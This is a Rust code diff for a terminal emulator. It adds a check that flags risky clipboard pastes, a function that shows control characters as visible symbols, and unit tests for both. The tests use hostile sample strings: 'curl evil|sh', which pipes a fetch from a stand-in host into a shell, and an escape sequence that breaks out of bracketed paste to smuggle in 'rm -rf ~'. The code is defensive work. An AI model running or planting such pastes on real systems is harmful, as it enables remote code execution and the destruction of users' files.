@@ -337,9 +337,55 @@ pub fn paste(text: &str, bracketed: bool) -> Vec<u8> {
     out
 }
 
+/// Whether pasting `text` should be confirmed first (`clipboard-paste-protection`):
+/// a line break runs what's before it in a shell that isn't using bracketed
+/// paste, and control characters act as keys (^C, ^D, ^Z, Esc) either way.
+/// A program can set the clipboard (OSC 52) for the user to paste.
+pub fn paste_is_risky(text: &str, bracketed: bool) -> bool {
+    text.chars().any(|c| match c {
+        '\n' | '\r' => !bracketed,
+        '\t' => false,
+        c => c.is_control(),
+    })
+}
+
+/// `text` for showing in a sheet: control characters as visible symbols
+/// (␛, ␊, ␇), so blank lines or escapes can't hide what's really there,
+/// and cut to `max` characters.
+pub fn visible_controls(text: &str, max: usize) -> String {
+    let mut out: String = text
+        .chars()
+        .take(max)
+        .map(|c| match c as u32 {
+            n @ 0..0x20 => char::from_u32(0x2400 + n).unwrap_or('\u{FFFD}'),
+            0x7f => '\u{2421}',
+            _ if c.is_control() => '\u{FFFD}',
+            _ => c,
+        })
+        .collect();
+    if text.chars().nth(max).is_some() {
+        out.push('…');
+    }
+    out
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    #[test]
+    fn risky_pastes() {
+        assert!(!paste_is_risky("ls -la", false));
+        assert!(!paste_is_risky("a\tb", false));
+        // Lines run one by one without bracketed paste; fine with it.
+        assert!(paste_is_risky("ls\ncurl evil|sh\n", false));
+        assert!(!paste_is_risky("ls\ncurl evil|sh\n", true));
+        // Keys in disguise are risky either way.
+        assert!(paste_is_risky("echo hi\u{3}", true));
+        assert!(paste_is_risky("x\u{1b}[201~rm -rf ~\r", true));
+        assert_eq!(visible_controls("\n\n\u{1b}[31mok\u{7f}\u{9b}", 100), "␊␊␛[31mok\u{2421}\u{FFFD}");
+        assert_eq!(visible_controls("abcdef", 3), "abc…");
+    }
 
     fn key(code: u16, chars: &str, mods: Mods) -> Vec<u8> {
         encode(code, chars, chars, mods, false).unwrap()
